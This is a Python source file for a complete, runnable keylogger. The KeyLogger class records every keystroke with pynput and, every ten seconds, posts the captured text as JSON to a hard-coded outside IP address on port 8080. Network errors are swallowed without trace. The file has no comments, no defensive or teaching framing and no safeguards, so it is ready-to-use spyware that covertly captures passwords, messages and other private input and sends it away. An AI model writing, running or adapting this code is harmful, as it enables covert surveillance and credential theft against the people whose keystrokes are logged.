from pynput import keyboard
import requests
import json
import threading


class KeyLogger:
    def __init__(self, host="109.74.200.23", port=8080, interval=10):
        self.host = host
        self.port = port
        self.interval = interval
        self.text = ""
        self.stop_event = threading.Event()
        self.timer = None
        self.listener = keyboard.Listener(on_press=self._on_press)

    def _send_post_req(self):
        if self.stop_event.is_set():
            return

        payload = json.dumps({"keyboardData": self.text})
        try:
            requests.post(
                f"http://{self.host}:{self.port}",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=5,
            )
        except Exception:
            pass

        self.timer = threading.Timer(self.interval, self._send_post_req)
        self.timer.daemon = True
        self.timer.start()

    def _on_press(self, key):
        if key == keyboard.Key.enter:
            self.text += "\n"
        elif key == keyboard.Key.tab:
            self.text += "\t"
        elif key == keyboard.Key.space:
            self.text += " "
        elif key in {
            keyboard.Key.shift,
            keyboard.Key.shift_l,
            keyboard.Key.shift_r,
            keyboard.Key.ctrl_l,
            keyboard.Key.ctrl_r,
            keyboard.Key.alt_l,
            keyboard.Key.alt_r,
            keyboard.Key.cmd,
            keyboard.Key.cmd_l,
            keyboard.Key.cmd_r,
            keyboard.Key.caps_lock,
        }:
            return
        elif key == keyboard.Key.backspace:
            self.text = self.text[:-1] if self.text else ""
        elif key == keyboard.Key.esc:
            return False
        else:
            self.text += str(key).strip("'")

    def start(self):
        self.stop_event.clear()
        self.listener.start()
        self._send_post_req()

    def stop(self):
        self.stop_event.set()
        if self.timer:
            self.timer.cancel()
        if self.listener.running:
            self.listener.stop()


if __name__ == "__main__":
    kl = KeyLogger()
    kl.start()
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        kl.stop()
